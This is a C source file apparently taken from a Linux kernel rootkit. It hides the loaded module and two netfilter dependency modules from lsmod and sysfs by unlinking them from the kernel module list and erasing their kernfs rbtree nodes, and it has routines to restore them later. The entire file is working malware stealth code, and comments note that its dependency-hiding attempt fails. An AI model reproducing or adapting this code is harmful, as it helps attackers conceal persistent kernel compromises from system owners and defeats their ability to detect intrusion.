#include "utils.h"
#include "module_hiding.h"

/* backup pointers to previous element of list entry for modules */
static struct list_head *mod_prev;

/* list of dependencies */
struct data_node *dependencies = NULL;

/* module status */
static int module_is_hidden = 0;

void hide_module(struct module *mod)
{
	struct kernfs_node *node = mod->mkobj.kobj.sd;

	if(mod == THIS_MODULE) {
		/* backup previous entry of module list */
		mod_prev = mod->list.prev;
	}else{
		/* dependencies */
		struct module_node *mod_node;
		mod_node = kmalloc(sizeof(struct module_node),GFP_KERNEL);

		mod_node->mod = mod;
		mod_node->mod_next = mod->list.next;

		insert_data_node(&dependencies, (void *)mod_node);
	}

	/* remove module from module list */
	list_del(&mod->list);

	/* remove module from rbtree */
	rb_erase(&node->rb, &node->parent->dir.children);
	node->rb.__rb_parent_color = (unsigned long)(&node->rb);
}

void hide_dependencies(struct module *mod)
{
	/* does not work, cause unknown.
	 * maybe we need to work with "struct module_use", but since there's no
	 * further explanation on the web and in the books, we let it slide for 
	 * now

	struct list_head *pos;
	struct list_head *used_by = &mod->target_list;

	list_for_each(pos, used_by) {

		struct module *dependency = list_entry(pos, struct module, 
			source_list);

		hide_module(dependency);
	}
	*/

	hide_module(mod);
}

void module_hide(void)
{

	if(module_is_hidden)
		return;

	/* hide this particular module */
	hide_module(THIS_MODULE);

	/* 
	 * does not work, cause unknown.
	 * look above for explanation (hide_dependencies)

	hide_dependencies(THIS_MODULE);
	*/

	/* 
	 * hide all dependencies 
	 *
	 * since we load two more modules (nf_reject_ipv4, nf_reject_ipv6), 
	 * we need to hide them as well because lsmod command shows depen-
	 * dencies to this module in the list
	 */
	hide_dependencies(find_module("nf_reject_ipv4"));
	hide_dependencies(find_module("nf_reject_ipv6"));

	/* module is now hidden */
	module_is_hidden = 1;
}

int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name, 
	const void *ns)
{
	/* compare hash value */
	if(hash != kn->hash)
		return hash - kn->hash;

	/* compare ns */
	if(ns != kn->ns)
		return ns - kn->ns;

	/* compare name */
	return strcmp(name, kn->name);
}

/*
 * this code is a slight modification from:
 * http://lxr.free-electrons.com/source/Documentation/rbtree.txt
 */
void rb_add(struct kernfs_node *node)
{
	struct rb_node **child = &node->parent->dir.children.rb_node;
	struct rb_node *parent = NULL;

	while(*child) {
		struct kernfs_node *pos;
		int result;

		/* cast rb_node to kernfs_node */
		pos = rb_entry(*child, struct kernfs_node, rb);

		/* 
		 * traverse the rbtree from root to leaf (until correct place found)
		 * next level down, child from previous level is now the parent
		 */
		parent = *child;

		/* using result to determine where to put the node */
		result = nodecmp(pos, node->hash, node->name, node->ns);

		if(result < 0)
			child = &pos->rb.rb_left;
		else if(result > 0)
			child = &pos->rb.rb_right;
		else
			return;
	}
	
	/* add new node and reblance the tree */
	rb_link_node(&node->rb,parent, child);
	rb_insert_color(&node->rb, &node->parent->dir.children);
	
	/* needed for special cases */
	if (kernfs_type(node) == KERNFS_DIR)
		node->parent->dir.subdirs++;
}

void unhide_module(struct module *mod, struct list_head *head)
{
	if(mod == THIS_MODULE)
		list_add(&mod->list, head);
	else
		list_add_tail(&mod->list, head);

	/* add module back in rbtree */
	rb_add(mod->mkobj.kobj.sd);
}

void unhide_dependencies(struct data_node *deps)
{
	struct module_node *mod_node = (struct module_node *)deps->data;
	unhide_module(mod_node->mod, mod_node->mod_next);
	kfree(mod_node);
}
 
void module_unhide(void)
{
	/* check if module is already visible */
	if (!module_is_hidden)
		return;

	/* unhide dependencies */
	free_data_node_list_callback(&dependencies, unhide_dependencies);
	
	unhide_module(THIS_MODULE, mod_prev);
	module_is_hidden = 0;
}

MODULE_LICENSE("GPL");